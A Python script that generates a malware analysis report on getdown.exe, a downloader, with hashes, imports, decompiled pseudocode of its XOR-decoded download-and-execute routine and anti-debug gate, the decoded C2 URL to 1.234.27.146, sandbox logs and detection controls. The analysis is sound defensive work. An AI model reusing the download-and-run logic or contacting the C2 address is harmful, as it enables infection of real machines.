#!/usr/bin/env python3
"""getdown.exe -- the finished report, in the numbered-section structure.

Same shape as fill_report_brbbot_freeform.py: section headings, body text, and
[SCREENSHOT: ...] notes where a figure belongs. Screenshot markers are left in
deliberately -- a labelled gap is better than a figure that is silently missing.

Artifacts:
  static  out/static/getdown
  dynamic out/dynamic/cd78cf4af8e3-20261110-145417   (--mode full, 60 s, NOT elevated)
"""
import json, os, sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import report_writer

HERE = os.path.dirname(os.path.abspath(__file__))
PIPE = os.path.dirname(HERE)
ROOT = os.path.dirname(PIPE)
TXTDIR = os.path.join(ROOT, "report", "for610")
os.makedirs(TXTDIR, exist_ok=True)
TXT = os.path.join(TXTDIR, "getdown.txt")          # ONE report per sample

pm = json.load(open(os.path.join(PIPE, "out", "static", "getdown", "pe_meta.json"),
                    encoding="utf-8"))

sec = ["%-8s %9s %9s  H=%-6s %-4s" % ("name", "raw", "virtual", "entr", "perm")]
for s in pm["sections"]:
    sec.append("%-8s %9d %9d  H=%-6s %-4s"
               % (s["name"], s["rawsize"], s["vsize"], s["entropy"], s["perm"]))

DOC = [
    # ==================================================== 1. BASIC STATIC
    ("h1", "1. Basic Static Analysis"),

    ("h2", "1.1. File information"),
    ("body", [
        "- File name: getdown.exe",
        "- File type: Win64 exe (PE32+, x86-64)",
        "- File size: 38.00 KB (38,912 bytes)",
        "- Hash values:",
        "    + MD5:     2a8668a6d0e12c7380a26910d504ecbf",
        "    + SHA-1:   414300597938d64b3486be6004003d90d565360d",
        "    + SHA-256: cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a",
        "- Compilation Timestamp: 2015-02-25 06:12:17 UTC  (0x54ed67c1 / 1424844737)",
        "- Imphash: a675367c6d79f8c7b7603d13cfd0a3ff   (60 imports)",
        "- Header: x86-64, subsystem GUI, linker 10.0",
        "          image base 0x140000000, entry point 0x140001740",
        "- Digital signature: none",
        "- Icon: none",
        "- VERSIONINFO: absent -- and in fact the PE has NO resource directory at all",
    ]),
    ("text", [
        "The sample is 64-bit, so addresses are of the form 0x1400xxxxx rather than "
        "the 0x40xxxx of a 32-bit binary. It runs natively on a 64-bit analysis VM.",
        "On the compile timestamp: brbbot.exe, in the same day1 archive, carries "
        "TimeDateStamp 1424844738 against getdown's 1424844737. Those are CONSECUTIVE "
        "INTEGERS -- one second apart, same build session. That is the strongest "
        "file-derived evidence tying the two samples together.",
        "Honest caveat: getdown's filesystem modified time is 2015-02-27, two days "
        "AFTER its header. brbbot's matches its own header to the second. So "
        "getdown's build date has no second, independent corroboration.",
        "subsystem = GUI means no console window appears, although the sample has no "
        "user interface of any kind. That is a deliberate choice for a silent "
        "downloader.",
    ]),
    ("shot", "file hashes and size  --  CFF Explorer, or the pe_meta.py terminal"),
    ("shot", "TimeDateStamp 0x54ed67c1  --  CFF Explorer -> File Header"),

    ("h2", "1.2. Notable Strings"),
    ("text", [
        "138 strings recovered. The notable fact about them is a NEGATIVE one.",
        "NO URL, domain, IP address or path appears in plaintext. A search for "
        "http | www. | .com | .net | .php | .exe | / returns four hits and all four "
        "are C runtime text (the R6033 and R6024 error messages, and 'MM/dd/yy').",
        "A downloader whose target is absent from its strings is not a downloader "
        "without a target. The C2 URL is in the file, XOR-encoded; it is recovered in "
        "section 2.2.",
        "One string carries the 'regkey' tag from the triage tooling: "
        "'GetSystemTimeAsFileTime'. That is an IMPORT NAME, not a registry path -- a "
        "known tagging artifact. getdown writes no registry value at all, which "
        "section 3 confirms dynamically.",
        "Also absent: any user-agent string. That matters in section 3.5.",
        "Imported APIs -- 60 symbols from only 2 DLLs. The import table almost states "
        "the program's purpose by itself:",
    ]),
    ("body", [
        "urlmon.dll      1   URLDownloadToFileA",
        "",
        "KERNEL32.dll   59   CreateProcessA, GetTempPathA, GetTempFileNameA,",
        "                    IsDebuggerPresent,",
        "                    + 55 C runtime support imports (HeapAlloc, GetStringTypeW,",
        "                      GetCommandLineA, GetStartupInfoW, ...)",
    ]),
    ("text", [
        "A single URLMON import paired with CreateProcessA and the two temp-path APIs "
        "is the canonical downloader shape: fetch to a temporary file, then execute "
        "it. IsDebuggerPresent is the only anti-analysis import, and section 2.1 shows "
        "it is genuinely used.",
        "Of the 59 KERNEL32 imports only four belong to the sample's own logic; the "
        "rest is MSVCRT startup and heap plumbing. That is also why 135 functions were "
        "recovered for what is effectively a one-function program.",
        "There are no exports -- it is an EXE, not a DLL.",
    ]),
    ("shot", "the import table, showing urlmon.dll  --  CFF Explorer -> Import Directory"),
    ("shot", "the strings list  --  Detect It Easy -> Strings"),

    ("h2", "1.3. Packer Detection"),
    ("text", [
        "There is no packer in this sample. Rather than relying on an entropy "
        "threshold alone -- which misses packers that compress poorly -- the "
        "structural shape was checked:",
    ]),
    ("body", sec + [
        "",
        "whole file entropy H = %s" % pm["file_entropy"],
        "",
        "- 60 imported symbols across 2 DLLs   (a packer stub typically has < 15)",
        "- 135 recovered functions             (a stub typically has < 10)",
        "- highest section entropy 6.186       (a packed payload runs 7.0 - 8.0)",
        "- no section has raw size 0 with a large virtual size (no UPX0 signature)",
        "- no section is both writable and executable",
        "- code is denser than data (.text 6.186 vs .data 2.243), the normal direction",
    ]),
    ("text", [
        "One shape that looks suspicious and is not: .data has a virtual size of 8,736 "
        "against 4,096 raw, a ratio of 2.13x. That is NORMAL -- uninitialised data "
        "costs no file bytes. The signal that matters is an EXECUTABLE section with "
        "that ratio; .text here is 21,224 virtual against 21,504 raw, or 0.99x.",
        "A note on method: the entropy figures above are measured over the RAW FILE "
        "BYTES. Ghidra measures the loaded memory block, zero-padded out to the "
        "section's virtual size, which collapses the number for a packed section that "
        "is mostly padding and makes a packed sample read as clean.",
        "Consequence for the analysis: the disassembly is trustworthy as it stands. "
        "There is no unpacking step, no original entry point to find, and no packer "
        "stub to step through.",
    ]),
    ("shot", "entropy, whole file and per section  --  Detect It Easy -> Entropy"),

    # ================================================= 2. ADVANCED STATIC
    ("h1", "2. Advanced Static Analysis"),
    ("text", [
        "The sample was opened in Ghidra rather than IDA Pro: the IDA Freeware build "
        "available in the analysis VM has no decompiler, so it would give disassembly "
        "only. Addresses are identical in both tools and the names translate directly "
        "-- Ghidra's FUN_140001000 is IDA's sub_140001000.",
        "135 functions were recovered. Exactly ONE of them carries any capability "
        "score; the other 134 are Visual C++ runtime code.",
    ]),

    ("h2", "2.1. FUN_140001000 -- the entire program"),
    ("body", [
        "FUN_140001000   573 bytes, 4 xrefs",
        "  APIs: IsDebuggerPresent, GetTempPathA, GetTempFileNameA,",
        "        URLDownloadToFileA, CreateProcessA",
        "",
        "BVar2 = IsDebuggerPresent();",
        "if (BVar2 == 0) {                        <-- ANTI-DEBUG GATE",
        "",
        "    do { (&DAT_14000aec0)[i] ^= 0x83;    decode the URL base, 0x80 bytes",
        "         (&DAT_14000aec1)[i] ^= 0x83;",
        "         i += 2; } while (i < 0x80);",
        "    do { (&DAT_14000af40)[i] ^= 0x83;    decode the query string, 0x80 bytes",
        "         (&DAT_14000af41)[i] ^= 0x83;",
        "         i += 2; } while (i < 0x80);",
        "",
        "    GetTempPathA(0x104, &local_528);                    fail -> return 2",
        "    GetTempFileNameA(&local_528, \"BrB\", 0, &local_638); fail -> return 3",
        "",
        "    strncpy(&local_418, &DAT_14000aec0, 0x3ff);",
        "    if (blob2 is not empty) {",
        "        strncat(&local_418, \"?\", 0x3ff);",
        "        strncat(&local_418, &DAT_14000af40, 0x3ff);",
        "    }",
        "",
        "    URLDownloadToFileA(NULL, &local_418, &local_638, 0, NULL);",
        "                                                        fail -> return 1",
        "    CreateProcessA(&local_638, NULL, NULL, NULL, 0, 0,",
        "                   NULL, NULL, &local_6a8, &local_6c8);",
        "                                                        fail -> return 4",
        "}",
        "return 0;",
    ]),
    ("text", [
        "Before describing any of these file operations it is necessary to name which "
        "buffer holds which path, because two char arrays of the same size are easy to "
        "confuse and the distinction is what the code means:",
    ]),
    ("body", [
        "local_528   the %TEMP% directory            (GetTempPathA output)",
        "local_638   the DOWNLOADED FILE's path      (GetTempFileNameA output)",
        "            -- written to by URLDownloadToFileA AND launched by",
        "               CreateProcessA. The same buffer. That IS the download-and-run.",
        "local_418   the assembled URL, 0x400 bytes (strncpy then conditional strncat)",
    ]),
    ("text", [
        "THE ANTI-DEBUG GATE IS THE MOST IMPORTANT DETAIL IN THIS SECTION. The entire "
        "body sits inside 'if (IsDebuggerPresent() == 0)', and the function returns 0 "
        "either way. Under a naively attached debugger the sample does nothing at all "
        "and reports success -- no file, no network, no child process, exit code 0. "
        "That is indistinguishable from a benign program, and it is what an analyst "
        "gets by default. To debug this sample the check must be neutralised first: "
        "patch the conditional jump after the call, clear the BeingDebugged byte in "
        "the PEB, or set a breakpoint past the gate.",
        "The return values are distinct per failure (1 download, 2 temp path, 3 temp "
        "file, 4 launch) but nothing reads them -- this is the entry path, so they are "
        "visible only to a debugger or as the process exit code.",
        "There are three loops, all trivial: two fixed-count XOR decode loops and one "
        "inline strlen scanning the second blob for its terminator. There is no beacon "
        "loop, no retry and no sleep. The sample runs once, top to bottom, and exits.",
        "What the code does NOT contain, checked rather than assumed: no registry API, "
        "no service API, no process enumeration, no injection API (WriteProcessMemory, "
        "CreateRemoteThread and VirtualAllocEx are all absent from the 60 imports), no "
        "crypto, no keyboard hook, and no second URL.",
    ]),
    ("shot", "decompiled FUN_140001000  --  Ghidra -> G -> 140001000 -> Decompile window"),
    ("shot", "the two XOR loops in the disassembly  --  Ghidra -> Listing window"),

    ("h2", "2.2. Recovering the C2 URL without running the sample"),
    ("text", [
        "The two blobs decoded by the loops above sit in .data. Imagebase is "
        "0x140000000, so their file offsets follow directly, and XOR 0x83 is "
        "reversible with no VM and no network:",
    ]),
    ("body", [
        "VA 0x14000aec0   RVA 0xaec0   file offset 0x8ec0   128 bytes",
        "    -> http://1.234.27.146/pcfix.exe",
        "",
        "VA 0x14000af40   RVA 0xaf40   file offset 0x8f40   128 bytes",
        "    -> affid=23456732-34459",
        "",
        "assembled by strncpy + strncat(\"?\") + strncat(blob2):",
        "",
        "    http://1.234.27.146/pcfix.exe?affid=23456732-34459",
    ]),
    ("text", [
        "Two observations worth recording. The target is a hardcoded IPv4 LITERAL, not "
        "a domain -- so the sample never performs a name resolution, and a detection "
        "that watches DNS will miss it entirely. And 'affid=' is an affiliate "
        "identifier, the convention used by pay-per-install distribution schemes: it "
        "identifies the distributor to the operator. It is the most distinctive string "
        "in the sample and the best hunting pivot.",
        "'pcfix.exe' suggests a fake system-repair lure, but that is a filename chosen "
        "by the operator and is not evidence of what the payload actually does.",
    ]),
    ("shot", "the terminal showing the decoded URL"),

    # ================================================== 3. BASIC DYNAMIC
    ("h1", "3. Basic Dynamic Analysis"),
    ("text", [
        "The sample was detonated in a local, isolated VMware virtual machine rather "
        "than uploaded to an online sandbox. Uploading a sample to a third-party "
        "service publishes it, which cannot be undone; the equivalent visibility is "
        "obtained locally with FakeNet-NG simulating the internet inside the same VM.",
        "Verified at run time rather than assumed: the VM's NIC is host-only with no "
        "route to the internet, shared folders are disabled, a clean snapshot exists, "
        "and the VM was reverted afterwards with the revert verified.",
    ]),

    ("h2", "3.1. Run context"),
    ("body", [
        "run      : out/dynamic/cd78cf4af8e3-20261110-145417",
        "mode     : full (Procmon + FakeNet-NG)   timeout 60 s",
        "elevated : FALSE",
        "fakenet  : summary=True, and detonate.log carries 'FakeNet-NG up (pid 252)'",
        "",
        "launched pid 4072, running as sample.exe",
        "lifetime     2:54:57.553 -> 2:54:58.405  = about 852 ms",
        "3,378 Procmon events attributable to the sample; it exited on its own",
    ]),
    ("text", [
        "A note that cost real time: in --copy mode the process is named sample.exe, "
        "NOT the host filename. Querying Procmon by the original name returns zero "
        "events on a run that generated 3,378, which reads exactly like a sample that "
        "did nothing.",
        "The sample needed no administrator rights. It was launched unelevated and "
        "completed its entire intended sequence.",
    ]),

    ("h2", "3.2. File system artifacts"),
    ("text", ["The file chain, first-hand from Procmon, in order:"]),
    ("body", [
        "2:54:57.773121  CreateFile         SUCCESS  %TEMP%\\BrBF5BD.tmp",
        "2:54:58.360456  CreateFile         SUCCESS  %TEMP%\\BrBF5BD.tmp",
        "2:54:58.360552  WriteFile          SUCCESS  %TEMP%\\BrBF5BD.tmp",
        "2:54:58.360797  RegOpenKey   NAME NOT FOUND  HKLM\\...\\Image File Execution",
        "                                             Options",
        "2:54:58.362532  CreateFileMapping  SUCCESS  %TEMP%\\BrBF5BD.tmp",
    ]),
    ("text", [
        "Read against the code: the first CreateFile is GetTempFileNameA creating its "
        "unique file, and the 'BrB' prefix observed in the guest matches the string "
        "hardcoded at FUN_140001000 exactly. The WriteFile is URLDownloadToFileA "
        "committing the response body, so its presence proves the download SUCCEEDED. "
        "The IFEO lookup followed by CreateFileMapping is the Windows loader starting "
        "an image -- that is the CreateProcessA call, so execution of the downloaded "
        "file was ATTEMPTED.",
        "The 'BrB' prefix is hardcoded but the four hex characters are assigned by "
        "Windows, so the GLOB %TEMP%\\BrB????.tmp is the indicator, not the exact name.",
        "What was actually downloaded:",
    ]),
    ("body", [
        "path   %TEMP%\\BrBF5BD.tmp",
        "size   1,447 bytes",
        "sha256 FE4B63AD9F486B7664C240397CCDEE91FABF15DF5CCD39B80B0EEAA6A47B86E4",
        "magic  3c 68 74 6d  = '<htm'",
        "",
        "content: FakeNet-NG's default HTTP response page.",
    ]),
    ("text", [
        "So the payload actually delivered was the instrumentation's own placeholder, "
        "not the operator's binary. That explains the one thing that did not happen: "
        "NO CHILD PROCESS was created -- the sample's process tree is a single pid. An "
        "HTML file is not a valid PE, so CreateProcessA failed and the sample returned.",
        "Against a live C2 serving a real executable there would be a child process "
        "here, and this section would continue into that payload's behaviour. The real "
        "payload at /pcfix.exe was never obtained and nothing in this report describes "
        "it.",
    ]),
    ("shot", "the sample's file operations  --  Procmon, filtered to sample.exe"),
    ("shot", "the BrB????.tmp file in %TEMP%  --  Explorer"),
    ("shot", "the downloaded file opened in Notepad -- it is FakeNet's HTML page"),

    ("h2", "3.3. Registry and persistence"),
    ("text", [
        "The only new registry key in the entire run is:",
    ]),
    ("body", [
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDivert1.3",
    ]),
    ("text", [
        "That is FakeNet-NG's own packet-capture driver -- the measuring instrument, "
        "not the sample. The triage tooling reports it under a 'service' label, so a "
        "sample with genuinely no persistence shows exactly one 'indicator' and it "
        "belongs to the analyst's own toolkit.",
        "getdown.exe establishes NO persistence. Classes checked and their results: "
        "zero registry writes attributable to the sample across Run and RunOnce in "
        "both hives, Winlogon, Image File Execution Options, User Shell Folders and "
        "CurrentControlSet\\Services; no service created; no scheduled task created; "
        "no self-copy anywhere in the watched tree; no Startup-folder drop.",
        "Stronger than 'not observed': the sample CANNOT persist. Its 60 imports "
        "contain no registry API at all, no service API, and no CopyFile or MoveFile. "
        "There is no code path to a persistence mechanism, so this is not a case of a "
        "condition going unmet in one particular run.",
        "Classes NOT monitored at all, so silence about them means nothing: WMI event "
        "subscriptions, COM hijacking, DLL search-order hijacking, AppInit_DLLs and "
        "AppCertDlls. Also invisible: a value nested below one of the watched keys, "
        "because the snapshot records each key's own values plus only the NAMES of its "
        "immediate subkeys.",
    ]),
    ("shot", "Regedit at ...\\CurrentVersion\\Run showing NO new value  --  Regedit"),

    ("h2", "3.4. Processes"),
    ("text", [
        "No child process. The sample's process tree is one pid, for the reason given "
        "in 3.2 -- the downloaded file was not a valid executable.",
        "Of the 23 new processes recorded by the snapshot diff, none is attributable "
        "to the sample: they are FakeNet's own components and ordinary Windows "
        "background activity. Ancestry taken from a snapshot diff is weak evidence in "
        "any case, because once a process has exited an unrelated one can carry its "
        "dead pid.",
    ]),

    ("h2", "3.5. Network artifacts"),
    ("text", [
        "This is the one section where static and dynamic independently produced the "
        "same answer. FakeNet-NG recorded, first-hand and with the process attributed:",
    ]),
    ("body", [
        "[Diverter]       sample.exe (4072) requested TCP 1.234.27.146:80",
        "[HTTPListener80] GET /pcfix.exe?affid=23456732-34459 HTTP/1.1",
        "[HTTPListener80] Host: 1.234.27.146",
        "[HTTPListener80] Accept: */*",
        "[HTTPListener80] UA-CPU: AMD64",
        "[HTTPListener80] Accept-Encoding: gzip, deflate",
        "[HTTPListener80] Connection: Keep-Alive",
    ]),
    ("text", [
        "The request on the wire is byte-for-byte the URL decoded from the file in "
        "section 2.2.",
        "NO DNS, and that is a positive finding rather than a gap. The target is an IP "
        "literal, so no name resolution is needed or attempted. The DNS queries that "
        "do appear in the log all belong to svchost resolving Microsoft telemetry "
        "hosts. A detection rule for this sample must watch flows, not DNS.",
        "THE USER-AGENT IS NOT AN INDICATOR. The request carried 'Mozilla/4.0 "
        "(compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/7.0; .NET4.0C; "
        ".NET4.0E; Tablet PC 2.0)' -- but no user-agent string exists anywhere in the "
        "binary, as section 1.2 established. URLDownloadToFileA supplies the host's "
        "own Internet Explorer user-agent, so this value describes the ANALYSIS "
        "MACHINE and would differ on every victim. Reporting it as getdown's "
        "user-agent would be a false indicator. By contrast brbbot.exe hardcodes its "
        "user-agent at 0x14000ff30, and that one IS an indicator.",
        "For honest reading of the rest of the network data: FakeNet redirects all "
        "traffic to 192.0.2.123 (RFC 5737 TEST-NET-1), so the 59 TCP endpoints in the "
        "summary are dominated by the guest's own background traffic. Only the "
        "[Diverter] line above attributes a flow to the sample's pid. Procmon logged "
        "no TCP event at all for pid 4072, which makes FakeNet's log the better "
        "network source here, not a backup for it.",
    ]),
    ("shot", "the GET /pcfix.exe request  --  FakeNet-NG console"),
    ("shot", "the Diverter line naming pid 4072  --  FakeNet-NG console"),

    # ====================================================== 4. CONCLUSION
    ("h1", "4. Conclusion"),
    ("text", [
        "getdown.exe is a first-stage downloader. It checks for an attached debugger "
        "and does nothing if one is present; otherwise it decodes a URL hidden in its "
        "own .data as two XOR-0x83 blobs, creates a uniquely named file in %TEMP% with "
        "the hardcoded prefix 'BrB', downloads one executable to it over plain HTTP, "
        "runs it, and exits. The whole sequence takes under a second and leaves no "
        "persistence behind.",
        "This is an INFERENCE, with the confidence stated: HIGH. What supports it is "
        "all observed -- the import table is almost a specification (URLDownloadToFileA "
        "as the only non-CRT network import, plus the two temp-path APIs and "
        "CreateProcessA), the single capability-bearing function performs exactly that "
        "sequence and returns, and the sequence was observed end to end in the guest.",
        "Key host indicators: the glob %TEMP%\\BrB????.tmp; and behaviourally, a "
        "%TEMP% file that is created, written once and immediately mapped for "
        "execution by a short-lived process that has made exactly one outbound HTTP "
        "request. Key network indicators: 1.234.27.146 on TCP/80, the URI path "
        "/pcfix.exe, and the query affid=23456732-34459. NOT an indicator: the HTTP "
        "user-agent, for the reason given in 3.5.",
        "The sample needs no administrator rights, so a standard user account is "
        "sufficient for a full compromise handoff. Its only real precondition is "
        "network egress: with it, an arbitrary operator-supplied executable runs and "
        "the impact is unbounded from this sample's point of view; without it, "
        "URLDownloadToFileA fails, the function returns before CreateProcessA, and the "
        "host is left with one empty file in %TEMP%. In this run the download "
        "succeeded ONLY because FakeNet-NG answered in the C2's place, so the result "
        "demonstrates the full code path but says nothing about what a real infection "
        "would have installed.",
        "Controls that would block it, cheapest first: egress filtering on outbound "
        "HTTP -- a direct TCP/80 connection to a bare IPv4 literal with no preceding "
        "DNS lookup is anomalous on a managed network and is the cleanest detection "
        "point; application allowlisting, which stops CreateProcessA on an unsigned "
        "binary that appeared in %TEMP% seconds earlier; and blocking execution from "
        "%TEMP%. DNS sinkholing would NOT block this sample.",
        "Not determined: how getdown itself arrived. There is no carrier document, "
        "e-mail, exploit or installer in the analysed artifact set. Being a "
        "first-stage downloader, getdown is itself the second stage of something, and "
        "whatever delivered it is the actual root cause. Also unknown is what the "
        "payload at /pcfix.exe does, since that file was never obtained.",
        "On provenance rather than attribution: getdown and brbbot.exe have "
        "consecutive TimeDateStamps one second apart, and getdown's temp-file prefix "
        "is 'BrB' while brbbot drops brbconfig.tmp and derives its RC4 key from a "
        "passphrase that base64-decodes to 'brbbot'. A shared origin is the economical "
        "reading. But the URL serves pcfix.exe, the payload was never retrieved, and "
        "no third-party research was performed -- so 'getdown downloads brbbot' "
        "remains an inference and is not demonstrated here.",
    ]),
]


def main():
    report_writer.render_freeform_txt(
        DOC, "Malware Analysis Report - getdown.exe", TXT)


if __name__ == "__main__":
    main()
